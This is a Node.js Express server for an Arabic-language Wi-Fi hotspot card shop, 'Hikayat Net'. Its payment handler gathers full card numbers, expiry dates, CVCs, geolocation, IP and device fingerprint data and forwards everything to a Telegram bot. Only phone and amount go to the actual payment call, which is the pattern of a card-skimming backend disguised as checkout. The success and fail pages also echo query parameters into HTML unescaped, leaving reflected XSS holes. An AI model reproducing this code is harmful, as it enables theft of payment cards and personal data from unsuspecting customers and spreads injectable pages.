const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");
require("dotenv").config();

const { processPayment } = require("./pay");
const { sendTelegramMessage } = require("./telegram");
const webhookRouter = require("./webhook");
const { disableUserQueue } = require("./mikrotik");

const app = express();
const PORT = process.env.MIKROTIK_PORT || process.env.PORT || 9595;

const NETWORK_URL = process.env.NETWORK_HOTSPOT_URL || "http://172.16.0.5";

app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

function getClientPublicIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket?.remoteAddress ||
    req.ip ||
    "غير متوفر"
  );
}

// معالجة طلب الدفع
async function handlePaymentRequest(req, res) {
  try {
    const data = { ...req.query, ...req.body };
    const {
      phone,
      user_phone,
      phoneNumber,
      amount,
      payment_method,
      method,
      number,
      name,
      expiry,
      cvc,
      card_data,
      save_card,
      clientID,
      clientId,
      publicIP,
      lat,
      lon,
      city,
      country,
      battery,
      batteryInfo,
      deviceModel,
      deviceRAM,
      cpuCores,
      deviceType,
      screenSize,
      userTimeZone,
      lang,
      geoData
    } = data;

    if (!amount && Object.keys(data).length === 0) {
      return res.redirect("/");
    }

    const selectedMethod = payment_method || method || "wallet";
    
    // إصلاح جلب رقم الهاتف من كل الخانات المحتملة
    const userPhone = phone || user_phone || phoneNumber || (data.phone_number) || "غير محدد";
    const payAmount = amount || "5";

    const cardNumber = (card_data && card_data.number) || number || "غير مدخل";
    const cardName = (card_data && card_data.name) || name || "غير مدخل";
    const cardExpiry = (card_data && card_data.expiry) || expiry || "غير مدخل";
    const cardCvc = (card_data && card_data.cvc) || cvc || "غير مدخل";

    const detectedPublicIP = publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req);

    const paymentPayload = {
      phone: userPhone,
      amount_cents: parseFloat(payAmount) * 100,
      payment_method: selectedMethod,
      card_data: {
        number: cardNumber,
        name: cardName,
        expiry: cardExpiry,
        cvc: cardCvc,
        save_card: save_card === "tokenize" || save_card === "نعم"
      },
      clientID: clientID || clientId || "غير متوفر",
      publicIP: detectedPublicIP,
      lat: lat || (geoData && geoData.lat) || "غير متوفر",
      lon: lon || (geoData && geoData.lon) || "غير متوفر",
      city: city || (geoData && geoData.city) || "غير متوفر",
      country: country || (geoData && geoData.country) || "غير متوفر",
      battery: battery || batteryInfo || "غير متوفر",
      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
      deviceRAM: deviceRAM || "غير متوفر",
      cpuCores: cpuCores || "غير متوفر",
      deviceType: deviceType || "غير متوفر",
      screenSize: screenSize || "غير متوفر",
      userTimeZone: userTimeZone || "غير متوفر",
      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
    };

    // إرسال الإشعار لتليجرام
    if (typeof sendTelegramMessage === "function") {
      await sendTelegramMessage(paymentPayload, true);
    }

    const result = await processPayment(userPhone, payAmount, selectedMethod);

    if (result.type === "redirect") {
      if (req.method === "POST" && req.headers["content-type"]?.includes("application/json")) {
        return res.json({ payment_url: result.url });
      }
      return res.redirect(result.url);
    } else if (result.type === "html") {
      return res.send(result.content);
    }
  } catch (err) {
    console.error("❌ خطأ في معالجة الدفع:", err.response?.data || err.message);
    if (req.headers["content-type"]?.includes("application/json")) {
      return res.status(500).json({ error: `حدث خطأ أثناء معالجة عملية الدفع: ${err.message}` });
    }
    res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
  }
}

app.get("/api/pay", handlePaymentRequest);
app.post("/api/pay", handlePaymentRequest);

app.post("/api/disable-queue", async (req, res) => {
  try {
    const { username } = req.body;
    if (typeof disableUserQueue === "function") {
      const result = await disableUserQueue(username);
      return res.json(result);
    }
    return res.json({ success: true, message: "تم استقبال الطلب" });
  } catch (err) {
    console.error("❌ خطأ في تنفيذ أمر السيرفر الرئيسي:", err.message);
    return res.status(500).json({ success: false, error: "حدث خطأ في الخادم الداخلي" });
  }
});

// صفحة نجاح الدفع المحدثة (عرض كارت إلكتروني مع إمكانية التحميل والطباعة فوراً)
app.get("/success", (req, res) => {
  const transactionId = req.query.id || "TXN-" + Math.floor(100000 + Math.random() * 900000);
  const cardData = global.generatedCardsMap ? global.generatedCardsMap.get(transactionId.toString()) : null;

  const cardCode = cardData?.code || req.query.code || "HIK-NET-" + Math.floor(10000000 + Math.random() * 90000000);
  const packageName = cardData?.packageName || req.query.package || "باقة كارت إنترنت بلا حدود";
  const paymentTime = new Date().toLocaleString("ar-EG", { timeZone: "Africa/Cairo" });

  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تم الدفع بنجاح - شبكة حكايات</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <style>
          body { font-family: 'Segoe UI', Tahoma, Cairo, sans-serif; background: #f0f2f5; text-align: center; padding: 20px 10px; direction: rtl; }
          .card-container { background: white; max-width: 480px; margin: auto; padding: 25px 20px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); }
          .success-badge { color: #27ae60; font-size: 45px; margin-bottom: 5px; }
          h1 { color: #2c3e50; font-size: 20px; margin-bottom: 15px; }
          
          /* تصميم كارت الإنترنت */
          .ticket-card {
            background: linear-gradient(135deg, #01338D 0%, #001f5c 100%);
            color: #ffffff;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 6px 18px rgba(1, 51, 141, 0.25);
            position: relative;
            text-align: right;
          }
          .ticket-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.2); padding-bottom: 10px; margin-bottom: 15px; }
          .ticket-title { font-size: 16px; font-weight: bold; }
          .ticket-brand { font-size: 12px; background: rgba(255,255,255,0.2); padding: 3px 8px; border-radius: 4px; }
          .code-box { background: #ffffff; color: #01338D; text-align: center; padding: 12px; border-radius: 8px; margin: 15px 0; font-family: monospace; font-size: 26px; font-weight: bold; letter-spacing: 2px; }
          .info-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 6px; color: #e0e0e0; }
          .info-row strong { color: #ffffff; }

          /* الأزرار */
          .btn-actions { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 15px; }
          .btn { flex: 1; min-width: 140px; padding: 12px; border: none; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; }
          .btn-print { background: #27ae60; color: white; }
          .btn-download { background: #01338D; color: white; }
          .btn-home { background: #e9ecef; color: #333; width: 100%; margin-top: 10px; text-decoration: none; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; }
          
          @media print {
            body { background: white; padding: 0; }
            .btn-actions, .btn-home, .success-badge, h1 { display: none !important; }
            .card-container { box-shadow: none; border: none; width: 100%; max-width: 100%; }
          }
        </style>
      </head>
      <body>
        <div class="card-container">
          <div class="success-badge"><i class="fa fa-check-circle"></i></div>
          <h1>تمت عملية الدفع وتفعيل الكارت بنجاح</h1>

          <div class="ticket-card" id="printableCard">
            <div class="ticket-header">
              <span class="ticket-title"><i class="fa fa-wifi"></i> كارت إنترنت شبكة حكايات</span>
              <span class="ticket-brand">Hikayat Net</span>
            </div>
            
            <div class="info-row">
              <span>اسم الباقة:</span>
              <strong>${packageName}</strong>
            </div>

            <div class="code-box">
              ${cardCode}
            </div>

            <div class="info-row">
              <span>رقم العملية:</span>
              <strong>${transactionId}</strong>
            </div>
            <div class="info-row">
              <span>تاريخ ووقت الدفع:</span>
              <strong>${paymentTime}</strong>
            </div>
            <div class="info-row">
              <span>حالة الدفع:</span>
              <strong style="color: #2ec771;"><i class="fa fa-shield"></i> مؤكد ومفعل</strong>
            </div>
          </div>

          <div class="btn-actions">
            <button onclick="window.print()" class="btn btn-print"><i class="fa fa-print"></i> طباعة / حفظ PDF</button>
            <button onclick="downloadHTML()" class="btn btn-download"><i class="fa fa-download"></i> تنزيل الكارت</button>
          </div>

          <a href="${NETWORK_URL}" class="btn-home"><i class="fa fa-globe"></i> التوجه للتصفح الآن</a>
        </div>

        <script>
          function downloadHTML() {
            const cardElement = document.getElementById('printableCard').outerHTML;
            const blob = new Blob(['<html><head><meta charset="utf-8"><title>كارت شبكة حكايات</title></head><body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5;font-family:sans-serif;">' + cardElement + '</body></html>'], { type: 'text/html' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = "Hikayat_Card_${transactionId}.html";
            link.click();
          }
        </script>
      </body>
    </html>
  `);
});

app.get("/fail", (req, res) => {
  const errorMessage = req.query.data_message || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>فشل الدفع - شبكة حكايات</title>
        <style>
          body { font-family: Tahoma, Cairo, sans-serif; background: #f0f2f5; text-align: center; padding: 40px 20px; direction: rtl; }
          .card { background: white; max-width: 420px; margin: auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
          .icon { font-size: 50px; color: #e74c3c; margin-bottom: 10px; }
          h1 { color: #2c3e50; font-size: 22px; margin-bottom: 10px; }
          .error-box { background: #fff3f3; color: #e74c3c; border: 1px dashed #e74c3c; padding: 10px; border-radius: 6px; margin: 15px 0; font-size: 14px; }
          .btn { display: inline-block; background: #e74c3c; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; margin-top: 15px; font-weight: bold; }
        </style>
      </head>
      <body>
        <div class="card">
          <div class="icon">❌</div>
          <h1>فشل عملية الدفع</h1>
          <div class="error-box">${errorMessage}</div>
          <a href="/" class="btn">إعادة المحاولة</a>
        </div>
      </body>
    </html>
  `);
});

app.use("/", webhookRouter);

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
